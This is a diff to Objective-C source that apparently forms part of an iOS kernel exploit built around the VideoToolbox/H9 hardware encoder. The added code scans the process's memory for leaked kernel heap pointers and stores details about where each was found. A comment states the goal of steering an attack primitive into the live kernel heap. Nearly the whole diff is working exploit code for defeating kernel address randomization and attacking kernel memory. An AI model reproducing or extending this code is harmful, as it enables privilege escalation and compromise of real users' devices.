@@ -2,6 +2,7 @@
 #import <UIKit/UIKit.h>
 #import "KPLog.h"
 #import "KPVMScanPolicy.h"
+#import "KPH9EncoderModule.h"
 #import <VideoToolbox/VideoToolbox.h>
 #import <CoreVideo/CoreVideo.h>
 #import <mach/mach.h>
@@ -12,6 +13,11 @@
 #ifndef F_SETPIPE_SZ
 #define F_SETPIPE_SZ 73
 #endif
+
+static inline BOOL IsExpectedZeroOffset(size_t off) {
+    size_t p = off & 0xfff;
+    return (p == 0x48 || p == 0x50 || p == 0xf0 || p == 0xf8 || p == 0x248 || p == 0x250);
+}
 
 // Hang fix (same class as H9): VTCompressionSessionCompleteFrames(kCMTimeInvalid)
 // deadlocks forever on a fault-latched session - and the path-ii shots
@@ -160,6 +166,15 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
 
     // 0) Pre-scan userspace RW memory for live ZONE_HEAP kernel pointers (e.g. 0xffffffedfd620000,
     //    0xffffffe289ee5658) so we can steer NTL directly into the live kernel heap band!
+    typedef struct {
+        uint64_t kptr;
+        vm_address_t userVA;
+        vm_address_t regionBase;
+        vm_size_t regionSize;
+        uint32_t userTag;
+        uint32_t shareMode;
+    } LiveCandRecord;
+    LiveCandRecord liveCands[8] = {0};
     uint64_t liveKPtrs[8] = {0};
     vm_address_t liveVAs[8] = {0};
     int liveKPtrCount = 0;
@@ -170,8 +185,8 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
         vm_region_submap_info_data_64_t info;
         mach_msg_type_number_t count = VM_REGION_SUBMAP_INFO_COUNT_64;
         uint64_t pageBuf[512];
-        vm_address_t exclAddrs[2] = { (vm_address_t)pageBuf, (vm_address_t)liveKPtrs };
-        vm_size_t exclSizes[2] = { sizeof(pageBuf), sizeof(liveKPtrs) };
+        vm_address_t exclAddrs[3] = { (vm_address_t)pageBuf, (vm_address_t)liveKPtrs, (vm_address_t)liveCands };
+        vm_size_t exclSizes[3] = { sizeof(pageBuf), sizeof(liveKPtrs), sizeof(liveCands) };
         for (int iter = 0; iter < 2048 && liveKPtrCount < 8; iter++) {
             count = VM_REGION_SUBMAP_INFO_COUNT_64;
             if (vm_region_recurse_64(mach_task_self(), &addr, &size, &depth,
@@ -181,7 +196,7 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
             if (info.is_submap) { depth++; continue; }
             if ((info.protection & (VM_PROT_READ | VM_PROT_WRITE)) == (VM_PROT_READ | VM_PROT_WRITE) &&
                 size <= 16 * 1024 * 1024 &&
-                !KPVMShouldSkipRegion(&info, addr, size, &depth, exclAddrs, exclSizes, 2)) {
+                !KPVMShouldSkipRegion(&info, addr, size, &depth, exclAddrs, exclSizes, 3)) {
                 for (vm_size_t off = 0; off + sizeof(pageBuf) <= size && liveKPtrCount < 8; off += sizeof(pageBuf)) {
                     vm_size_t outSz = 0;
                     if (vm_read_overwrite(mach_task_self(), addr + off, sizeof(pageBuf),
@@ -201,6 +216,12 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
                                 if ((liveKPtrs[k] >> 32) == (v >> 32)) { dup = YES; break; }
                             }
                             if (!dup) {
+                                liveCands[liveKPtrCount].kptr = v;
+                                liveCands[liveKPtrCount].userVA = addr + off + w * sizeof(uint64_t);
+                                liveCands[liveKPtrCount].regionBase = addr;
+                                liveCands[liveKPtrCount].regionSize = size;
+                                liveCands[liveKPtrCount].userTag = info.user_tag;
+                                liveCands[liveKPtrCount].shareMode = info.share_mode;
                                 liveVAs[liveKPtrCount] = addr + off + w * sizeof(uint64_t);
                                 liveKPtrs[liveKPtrCount++] = v;
                             }
